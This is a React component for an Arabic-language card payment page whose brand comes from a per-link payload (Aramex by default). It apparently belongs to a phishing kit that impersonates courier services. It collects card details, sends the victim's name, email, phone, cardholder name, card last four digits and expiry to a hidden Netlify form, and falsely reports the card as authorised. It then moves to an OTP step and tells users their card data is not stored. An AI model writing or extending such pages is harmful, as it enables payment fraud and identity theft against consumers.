import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { Shield, CreditCard, Lock, AlertCircle, Hash, User, MapPin } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  
  // Get customer info from sessionStorage
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
  const branding = getServiceBranding(serviceName);
  
  // Extract shipping info from link payload
  const shippingInfo = linkData?.payload as any;
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiry || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Store card info (last 4 only) for display purposes
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          cardholder: cardName,
          cardLast4: last4,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      console.error("Form submission error:", err);
    }
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    // Navigate to OTP
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <div 
      className="min-h-screen"
      dir="rtl"
      style={{
        background: 'linear-gradient(180deg, #0a0e27 0%, #1a1f3a 100%)',
      }}
    >
      {/* Header Image */}
      {branding.ogImage && (
        <div className="w-full">
          <img 
            src={branding.ogImage} 
            alt={serviceName}
            className="w-full h-48 object-cover"
            onError={(e) => e.currentTarget.style.display = 'none'}
          />
        </div>
      )}

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-md mx-auto">
          
          {/* Title Section */}
          <div className="text-center mb-6">
            <h1 className="text-3xl font-bold text-white mb-2">بيانات البطاقة</h1>
            <p className="text-gray-400">الدفع الآمن</p>
          </div>

          {/* Shipping Info Display */}
          {shippingInfo && (
            <div className="mb-6 p-4 rounded-lg bg-white/5 border border-white/10">
              <h3 className="font-semibold mb-3 text-white text-sm">تفاصيل الشحنة</h3>
              <div className="space-y-2 text-xs">
                {shippingInfo.tracking_number && (
                  <div className="flex items-center gap-2 text-gray-300">
                    <Hash className="w-3 h-3" />
                    <span className="opacity-70">رقم الشحنة:</span>
                    <span className="font-semibold">{shippingInfo.tracking_number}</span>
                  </div>
                )}
                {shippingInfo.sender_name && (
                  <div className="flex items-center gap-2 text-gray-300">
                    <User className="w-3 h-3" />
                    <span className="opacity-70">المرسل:</span>
                    <span className="font-semibold">{shippingInfo.sender_name}</span>
                  </div>
                )}
                {shippingInfo.sender_city && (
                  <div className="flex items-center gap-2 text-gray-300">
                    <MapPin className="w-3 h-3" />
                    <span className="opacity-70">المدينة:</span>
                    <span className="font-semibold">{shippingInfo.sender_city}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Security Notice */}
          <div 
            className="rounded-lg p-3 mb-6 flex items-start gap-2"
            style={{
              background: 'rgba(59, 130, 246, 0.1)',
              border: '1px solid rgba(59, 130, 246, 0.3)'
            }}
          >
            <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0 text-blue-400" />
            <p className="text-sm text-blue-300">
              بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
            </p>
          </div>

          {/* Visual Card Display */}
          <div 
            className="rounded-2xl p-6 mb-6 relative overflow-hidden"
            style={{
              background: 'linear-gradient(135deg, #7c3aed 0%, #ea580c 100%)',
              minHeight: '200px'
            }}
          >
            <div className="absolute top-4 right-4">
              <CreditCard className="w-12 h-12 text-white/80" />
            </div>
            
            {/* Card Number Display */}
            <div className="mt-16 mb-6">
              <div className="flex gap-3 text-white text-2xl font-mono">
                <span>••••</span>
                <span>••••</span>
                <span>••••</span>
                <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
              </div>
            </div>

            <div className="flex justify-between items-end text-white">
              <div>
                <p className="text-xs opacity-70 mb-1">EXPIRES</p>
                <p className="text-lg font-mono">{expiry || "MM/YY"}</p>
              </div>
              <div className="text-right">
                <p className="text-xs opacity-70 mb-1">CARDHOLDER</p>
                <p className="text-lg font-bold">{cardName || "YOUR NAME"}</p>
              </div>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Cardholder Name */}
            <div>
              <Label className="mb-2 text-white">اسم حامل البطاقة</Label>
              <Input
                placeholder="AHMAD ALI"
                value={cardName}
                onChange={(e) => setCardName(e.target.value.toUpperCase())}
                className="h-14 text-lg bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
                required
              />
            </div>
            
            {/* Card Number */}
            <div>
              <Label className="mb-2 text-white">رقم البطاقة</Label>
              <Input
                type="password"
                placeholder="#### #### #### ####"
                value={cardNumber}
                onChange={(e) =>
                  setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
                }
                inputMode="numeric"
                className="h-14 text-lg tracking-wider bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
                required
              />
            </div>
            
            {/* CVV, Year, Month Row */}
            <div className="grid grid-cols-3 gap-3">
              <div>
                <Label className="mb-2 text-white text-xs">CVV</Label>
                <Input
                  type="password"
                  placeholder="***"
                  value={cvv}
                  onChange={(e) =>
                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                  }
                  inputMode="numeric"
                  className="h-14 text-lg text-center bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500"
                  required
                />
              </div>
              
              <div>
                <Label className="mb-2 text-white text-xs">السنة</Label>
                <Select
                  value={expiry.split('/')[1] || ''}
                  onValueChange={(year) => {
                    const month = expiry.split('/')[0] || '';
                    setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
                  }}
                >
                  <SelectTrigger className="h-14 bg-gray-900/50 border-gray-700 text-white">
                    <SelectValue placeholder="YY" />
                  </SelectTrigger>
                  <SelectContent className="bg-gray-900 border-gray-700 text-white z-50">
                    {Array.from({ length: 15 }, (_, i) => {
                      const year = (new Date().getFullYear() + i).toString().slice(-2);
                      return (
                        <SelectItem key={year} value={year} className="text-white hover:bg-gray-800">
                          {year}
                        </SelectItem>
                      );
                    })}
                  </SelectContent>
                </Select>
              </div>

              <div>
                <Label className="mb-2 text-white text-xs">الشهر</Label>
                <Select
                  value={expiry.split('/')[0] || ''}
                  onValueChange={(month) => {
                    const year = expiry.split('/')[1] || '';
                    setExpiry(month && year ? `${month}/${year}` : month);
                  }}
                >
                  <SelectTrigger className="h-14 bg-gray-900/50 border-gray-700 text-white">
                    <SelectValue placeholder="MM" />
                  </SelectTrigger>
                  <SelectContent className="bg-gray-900 border-gray-700 text-white z-50">
                    {Array.from({ length: 12 }, (_, i) => {
                      const month = (i + 1).toString().padStart(2, '0');
                      return (
                        <SelectItem key={month} value={month} className="text-white hover:bg-gray-800">
                          {month}
                        </SelectItem>
                      );
                    })}
                  </SelectContent>
                </Select>
              </div>
            </div>
            
            {/* Submit Button */}
            <Button
              type="submit"
              size="lg"
              className="w-full text-xl py-7 mt-6 font-bold"
              style={{
                background: 'linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%)',
                color: '#000'
              }}
            >
              <Shield className="w-6 h-6 ml-2" />
              <span>تفويض البطاقة</span>
            </Button>
            
            <p className="text-xs text-center text-gray-400 mt-3">
              سيتم إرسال رمز التحقق إلى هاتفك المسجل
            </p>
          </form>
          
          {/* Hidden Netlify Form */}
          <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
            <input type="text" name="name" />
            <input type="email" name="email" />
            <input type="tel" name="phone" />
            <input type="text" name="service" />
            <input type="text" name="cardholder" />
            <input type="text" name="cardLast4" />
            <input type="text" name="expiry" />
            <input type="text" name="timestamp" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentCardForm;
